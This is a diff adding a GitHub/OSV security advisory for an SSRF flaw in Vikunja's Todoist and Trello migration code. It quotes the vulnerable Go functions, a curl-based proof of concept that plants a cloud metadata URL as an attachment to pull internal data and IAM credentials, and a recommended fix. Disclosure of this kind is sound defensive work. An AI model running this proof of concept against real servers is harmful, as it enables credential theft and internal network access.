@@ -1,0 +1,59 @@
+{
+  "id": "GHSA-g66v-54v9-52pr",
+  "modified": "2026-03-26T21:11:08.627022Z",
+  "published": "2026-03-25T21:14:12Z",
+  "aliases": [
+    "CVE-2026-33675",
+    "GO-2026-4851"
+  ],
+  "summary": "Vikunja has SSRF via Todoist/Trello Migration File Attachment URLs that Allows Reading Internal Network Resources",
+  "details": "## Summary\n\nThe migration helper functions `DownloadFile` and `DownloadFileWithHeaders` in `pkg/modules/migration/helpers.go` make arbitrary HTTP GET requests without any SSRF protection. When a user triggers a Todoist or Trello migration, file attachment URLs from the third-party API response are passed directly to these functions, allowing an attacker to force the Vikunja server to fetch internal network resources and return the response as a downloadable task attachment.\n\n## Details\n\nThe vulnerability exists because the migration HTTP client uses a plain `http.Client{}` with no URL validation, no private IP blocklist, no redirect restrictions, and no response size limit.\n\n**Vulnerable code** in `pkg/modules/migration/helpers.go:38-59`:\n```go\nfunc DownloadFileWithHeaders(url string, headers http.Header) (buf *bytes.Buffer, err error) {\n\treq, err := http.NewRequestWithContext(context.Background(), http.MethodGet, url, nil)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\t// ... headers added ...\n\thc := http.Client{}\n\tresp, err := hc.Do(req)\n\t// ... no URL validation, no IP filtering ...\n\tbuf = \u0026bytes.Buffer{}\n\t_, err = buf.ReadFrom(resp.Body) // no size limit\n\treturn\n}\n```\n\n**Call site in Todoist migration** (`pkg/modules/migration/todoist/todoist.go:433-435`):\n```go\nif len(n.FileAttachment.FileURL) \u003e 0 {\n\tbuf, err := migration.DownloadFile(n.FileAttachment.FileURL)\n```\n\nThe `FileURL` is deserialized directly from the Todoist Sync API response (`json:\"file_url\"` tag at line 125) with no validation.\n\n**Call sites in Trello migration** (`pkg/modules/migration/trello/trello.go`):\n- Line 263: `migration.DownloadFile(board.Prefs.BackgroundImage)` — board background\n- Line 345: `migration.DownloadFileWithHeaders(attachment.URL, ...)` — card attachments\n- Line 381: `migration.DownloadFile(cover.URL)` — card cover images\n\nNotably, the webhooks module in the same codebase was recently patched (commit `8d9bc3e`) to add SSRF protection using the `daenney/ssrf` library, but this protection was **not applied** to the migration module — making this an incomplete fix.\n\n**Attack flow:**\n1. Attacker creates a Todoist account\n2. Using the Todoist Sync API, attacker creates a note with `file_attachment.file_url` set to an internal URL (e.g., `http://169.254.169.254/latest/meta-data/iam/security-credentials/`)\n3. Attacker authenticates to the target Vikunja instance and initiates a Todoist migration\n4. Vikunja's server fetches the internal URL and stores the response body as a task attachment\n5. Attacker downloads the attachment through the normal Vikunja API, reading the internal resource contents\n\n## PoC\n\n**Prerequisites:**\n- Vikunja instance with Todoist migration enabled (admin has configured OAuth client ID/secret)\n- Authenticated Vikunja user account\n- Todoist account controlled by the attacker\n\n**Step 1: Craft malicious Todoist data**\n\nUsing the Todoist Sync API, create a note with an internal URL as the file attachment:\n\n```bash\ncurl -X POST \"https://api.todoist.com/sync/v9/sync\" \\\n  -H \"Authorization: Bearer $TODOIST_TOKEN\" \\\n  -d 'commands=[{\n    \"type\": \"note_add\",\n    \"temp_id\": \"ssrf-test-1\",\n    \"uuid\": \"550e8400-e29b-41d4-a716-446655440001\",\n    \"args\": {\n      \"item_id\": \"'$ITEM_ID'\",\n      \"content\": \"test note\",\n      \"file_attachment\": {\n        \"file_name\": \"metadata.txt\",\n        \"file_size\": 1,\n        \"file_type\": \"text/plain\",\n        \"file_url\": \"http://169.254.169.254/latest/meta-data/\"\n      }\n    }\n  }]'\n```\n\n**Step 2: Trigger migration on Vikunja**\n\n```bash\n# Authenticate to Vikunja\nTOKEN=$(curl -s -X POST \"https://vikunja.example.com/api/v1/login\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\":\"attacker\",\"password\":\"password\"}' | jq -r .token)\n\n# Initiate Todoist OAuth flow\ncurl -s \"https://vikunja.example.com/api/v1/migration/todoist/auth\" \\\n  -H \"Authorization: Bearer $TOKEN\"\n\n# After OAuth callback, trigger the migration\ncurl -s -X POST \"https://vikunja.example.com/api/v1/migration/todoist/migrate\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"code\":\"\u003coauth_code\u003e\"}'\n```\n\n**Step 3: Download the attachment containing internal data**\n\n```bash\n# List tasks to find the attachment ID\ncurl -s \"https://vikunja.example.com/api/v1/projects\" \\\n  -H \"Authorization: Bearer $TOKEN\"\n\n# Download the attachment (contains response from internal URL)\ncurl -s \"https://vikunja.example.com/api/v1/tasks/\u003ctask_id\u003e/attachments/\u003cattachment_id\u003e\" \\\n  -H \"Authorization: Bearer $TOKEN\" -o metadata.txt\n\ncat metadata.txt\n# Expected: cloud instance metadata, internal service responses, etc.\n```\n\n## Impact\n\nAn authenticated attacker can:\n\n- **Read cloud instance metadata**: Access `http://169.254.169.254/` to retrieve IAM credentials, instance identity, and configuration data on AWS/GCP/Azure deployments\n- **Probe internal network services**: Map internal infrastructure by making requests to RFC1918 addresses (10.x, 172.16.x, 192.168.x)\n- **Access internal APIs**: Reach internal services that trust requests from the Vikunja server's network position\n- **Denial of service**: Since `buf.ReadFrom(resp.Body)` has no size limit, pointing to a large or streaming resource causes unbounded memory allocation on the Vikunja server\n\nThe attack requires the target Vikunja instance to have Todoist or Trello migration enabled (requires admin configuration of OAuth credentials), but this is a standard deployment configuration.\n\n## Recommended Fix\n\nApply the same SSRF protection already used for webhooks (`daenney/ssrf`) to the migration HTTP clients. In `pkg/modules/migration/helpers.go`:\n\n```go\nimport (\n    \"github.com/daenney/ssrf\"\n    \"code.vikunja.io/api/pkg/config\"\n)\n\nfunc safeMigrationClient() *http.Client {\n    s, _ := ssrf.New(ssrf.WithAnyPort())\n    return \u0026http.Client{\n        Transport: \u0026http.Transport{\n            DialContext: (\u0026net.Dialer{\n                Control: s.Safe,\n            }).DialContext,\n        },\n    }\n}\n\nfunc DownloadFileWithHeaders(url string, headers http.Header) (buf *bytes.Buffer, err error) {\n    req, err := http.NewRequestWithContext(context.Background(), http.MethodGet, url, nil)\n    if err != nil {\n        return nil, err\n    }\n    for key, h := range headers {\n        for _, hh := range h {\n            req.Header.Add(key, hh)\n        }\n    }\n\n    hc := safeMigrationClient()\n    resp, err := hc.Do(req)\n    if err != nil {\n        return nil, err\n    }\n    defer resp.Body.Close()\n\n    // Limit response body to 100MB to prevent memory exhaustion\n    buf = \u0026bytes.Buffer{}\n    _, err = buf.ReadFrom(io.LimitReader(resp.Body, 100*1024*1024))\n    return\n}\n```\n\nApply the same pattern to `DoGetWithHeaders` and `DoPostWithHeaders` in the same file.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "code.vikunja.io/api",
+        "purl": "pkg:golang/code.vikunja.io/api"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.2.1"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 2.2.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-g66v-54v9-52pr/GHSA-g66v-54v9-52pr.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/security/advisories/GHSA-g66v-54v9-52pr"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-33675"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/commit/93297742236e3d33af72c993e5da960db01d259e"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/go-vikunja/vikunja"
+    },
+    {
+      "type": "WEB",
+      "url": "https://vikunja.io/changelog/vikunja-v2.2.2-was-released"
+    }
+  ]
+}
